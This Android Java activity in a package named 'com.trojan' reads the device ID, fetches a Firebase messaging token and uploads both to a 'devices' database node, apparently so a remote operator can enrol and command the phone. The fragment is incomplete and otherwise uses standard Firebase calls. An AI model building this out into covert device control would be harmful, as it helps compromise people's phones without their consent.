package com.trojan;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.messaging.FirebaseMessaging;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private TextView tvDeviceInfo; // Changed to show more info
    // ... (other buttons are the same)

    @SuppressLint("HardwareIds")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvDeviceInfo = findViewById(R.id.tvDeviceInfo); // Update this ID in your XML
        // ... (find other buttons)

        // Get a stable, unique ID for this device
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        String deviceInfoText = "Device ID:\n" + deviceId + "\n\nFetching FCM Token...";
        tvDeviceInfo.setText(deviceInfoText);

        // Now, fetch the token and save it to the database
        uploadTokenToDatabase(deviceId);
        
        // ... (setup for other buttons remains the same)
    }

    private void uploadTokenToDatabase(String deviceId) {
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(new OnCompleteListener<String>() {
            @Override
            public void onComplete(@NonNull Task<String> task) {
                if (!task.isSuccessful()) {
                    Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                    return;
                }

                // Get the new token
                String token = task.getResult();

                // Get a reference to our Realtime Database
                DatabaseReference database = FirebaseDatabase.getInstance().getReference("devices");
                
                // Save the token to the database under the unique device ID
                database.child(deviceId).setValue(token).addOnCompleteListener(dbTask -> {
                    if (dbTask.isSuccessful()) {
                        String successText = "Device ID:\n" + deviceId + "\n\nToken successfully uploaded to database.";
                        tvDeviceInfo.setText(successText);
                        Log.d(TAG, "Token uploaded successfully.");
                    } else {
                        tvDeviceInfo.setText("Failed to upload token to database.");
                        Log.w(TAG, "Database write failed", dbTask.getException());
                    }
                });
            }
        });
    }
}
